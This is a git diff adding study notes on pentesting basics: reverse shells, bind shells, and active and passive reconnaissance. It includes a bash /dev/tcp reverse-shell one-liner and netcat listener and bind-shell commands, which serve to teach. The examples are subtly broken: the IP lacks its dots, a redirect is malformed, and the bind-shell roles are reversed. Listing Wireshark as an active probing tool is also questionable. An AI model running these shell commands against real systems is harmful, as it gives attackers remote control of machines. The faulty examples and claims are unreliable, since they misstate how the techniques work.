@@ -145,3 +145,62 @@ Internal Vulnerability Assessment and Penetration Testing (VAPT) focuses on test
 
 External VAPT (Vulnerability Assessment and Penetration Testing) is a security testing process used to identify and test vulnerabilities in an organization’s internet-facing systems, such as websites, web applications, servers, firewalls, APIs, and other public-facing infrastructure. It simulates real-world attacks from external hackers who try to gain unauthorized access from outside the organization’s network. The main goal of External VAPT is to discover security weaknesses that attackers could exploit and help organizations fix them before a real cyberattack happens.
 
+# Reverse Shell
+
+A reverse shell is when the target machine connects back to the attacker’s machine.
+### How it works:
+
+1. Attacker starts a listener on their machine (waiting for a connection).
+2. Target machine runs a command that connects out to the attacker.
+3. Once connected, the attacker gets a shell on the target.
+
+### Why it's used:
+
+- Works well when the target is behind a firewall/NAT (outgoing connections are usually allowed).
+- Common in penetration testing and real-world attacks.
+
+**Example:** 
+```
+Attacker - nc -lnvp 4444
+Victim - bash -c 'bash -i > & /dev/tcp/192168.1.5/4444 0>&1'
+```
+
+# Bind Shell
+
+A bind shell is when the target machine opens a port and waits for the attacker to connect.
+
+### How it works:
+
+1. Target machine opens a listening port.
+2. Attacker connects to that port.
+3. Attacker gets shell access.
+
+### Why it's less common:
+
+- Requires the target’s firewall to allow incoming connections.
+- Easier to detect and block.
+
+**Example:** 
+```
+Attacker - nc -lnvp 4444 -e /bin/bash
+Victim - nc 127.0.0.1 4444
+```
+
+|Feature|Reverse Shell|Bind Shell|
+|---|---|---|
+|Connection|Target connects to attacker|Attacker connects to target|
+|Firewall|Bypasses many firewalls|Often blocked by firewalls|
+|Setup|Attacker listens|Target listens|
+|Stealth|More stealthy|Less stealthy|
+
+# What is Reconnaissance?
+
+In cybersecurity and penetration testing, reconnaissance (recon) is the process of gathering information about a target before attempting any attack or security assessment. It is the first phase of ethical hacking and helps identify details such as IP addresses, domains, open ports, running services, technologies, vulnerabilities, and network structure. Recon can be passive, where information is collected without directly interacting with the target, or active, where the tester interacts with the system through techniques like port scanning and service enumeration. The main purpose of recon is to understand the target environment, map the attack surface, and identify potential weaknesses that can be tested further during a penetration test.
+
+## Active Recon:
+
+Active reconnaissance (active recon) is the process of gathering information about a target by directly interacting with its systems, networks, or applications. In this method, the attacker or penetration tester sends requests or probes to the target to discover details such as open ports, running services, operating systems, network structure, and possible vulnerabilities. Common active recon techniques include port scanning, ping sweeps, banner grabbing, and vulnerability scanning using tools like Nmap and Wireshark. Unlike passive recon, active recon can usually be detected by firewalls, intrusion detection systems, or server logs because the target system is being directly contacted.
+
+## Passive Recon:
+
+Passive reconnaissance (passive recon) is the process of gathering information about a target without directly interacting with its systems or network. The goal is to collect publicly available information while remaining unnoticed. In passive recon, attackers or penetration testers use sources such as search engines, social media, public records, DNS information, WHOIS databases, job postings, and leaked data to learn about the target’s infrastructure, technologies, employees, domains, and email addresses. Since there is no direct communication with the target system, passive recon is difficult to detect and is commonly used as the first step in penetration testing and ethical hacking.
